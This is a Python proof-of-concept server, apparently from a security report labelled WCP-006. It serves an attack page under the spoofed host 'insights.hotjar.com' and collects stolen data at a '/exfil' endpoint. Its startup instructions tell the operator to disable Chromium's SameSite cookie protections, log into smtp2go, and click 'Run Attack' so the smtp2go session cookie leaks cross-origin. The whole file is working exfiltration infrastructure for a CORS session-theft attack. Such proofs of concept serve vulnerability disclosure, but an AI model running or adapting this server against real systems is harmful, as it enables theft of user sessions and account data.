#!/usr/bin/env python3
"""
WCP-006 All-in-one PoC server
Serves the HTML PoC page AND receives exfiltrated data.
Run: sudo python3 server.py
Then visit: http://insights.hotjar.com
"""

from http.server import BaseHTTPRequestHandler, HTTPServer, ThreadingHTTPServer
import json, datetime, sys, os

PORT = 80
POC_DIR = os.path.dirname(os.path.abspath(__file__))
POC_FILE = os.path.join(POC_DIR, 'wcp-006-cors-hotjar.html')

CORS_HEADERS = {
    'Access-Control-Allow-Origin': '*',
    'Access-Control-Allow-Methods': 'POST, GET, OPTIONS',
    'Access-Control-Allow-Headers': 'Content-Type',
}

class Handler(BaseHTTPRequestHandler):
    def log_message(self, format, *args):
        pass  # suppress default noise

    def send_cors(self, code=200, content_type='text/plain'):
        self.send_response(code)
        for k, v in CORS_HEADERS.items():
            self.send_header(k, v)
        self.send_header('Content-Type', content_type)
        self.end_headers()

    def do_OPTIONS(self):
        self.send_cors(200)

    def do_GET(self):
        if self.path in ('/', '/index.html', '/wcp-006-cors-hotjar.html'):
            try:
                with open(POC_FILE, 'rb') as f:
                    data = f.read()
                self.send_cors(200, 'text/html; charset=utf-8')
                self.wfile.write(data)
            except FileNotFoundError:
                self.send_cors(404)
                self.wfile.write(b'PoC file not found')
        else:
            self.send_cors(404)
            self.wfile.write(b'Not found')

    def do_POST(self):
        if self.path != '/exfil':
            self.send_cors(404)
            self.wfile.write(b'Not found')
            return

        length = int(self.headers.get('Content-Length', 0))
        body = self.rfile.read(length).decode('utf-8', errors='replace')
        ts = datetime.datetime.now().strftime('%H:%M:%S')

        self.send_cors(200, 'application/json')
        self.wfile.write(b'{"ok":true}')

        print(f"\n{'='*60}")
        print(f"[{ts}] *** EXFIL RECEIVED ***")
        print(f"{'='*60}")
        try:
            parsed = json.loads(body)
            label = parsed.get('label', 'unknown')
            print(f"Label: {label}")
            print(json.dumps(parsed.get('data', parsed), indent=2)[:4000])
        except Exception:
            print(body[:3000])
        print(f"{'='*60}\n")
        sys.stdout.flush()

if __name__ == '__main__':
    server = ThreadingHTTPServer(('0.0.0.0', PORT), Handler)
    print(f"[*] WCP-006 PoC server → http://0.0.0.0:{PORT}")
    print(f"[*] Serving: {POC_FILE}")
    print(f"[*] Exfil receiver: POST /exfil\n")
    print("=" * 65)
    print("IMPORTANT — Chrome must be launched with SameSite disabled")
    print("so the smtp2go session cookie is sent cross-origin:\n")
    print("  chromium --disable-features=SameSiteByDefaultCookies,CookiesWithoutSameSiteMustBeSecure \\")
    print("           --user-data-dir=/tmp/chrome-nosamesite \\")
    print("           http://insights.hotjar.com\n")
    print("Then log into smtp2go in the SAME Chrome window.")
    print("Navigate back to http://insights.hotjar.com and click Run Attack.")
    print("=" * 65)
    print()
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print('\n[*] Stopped.')
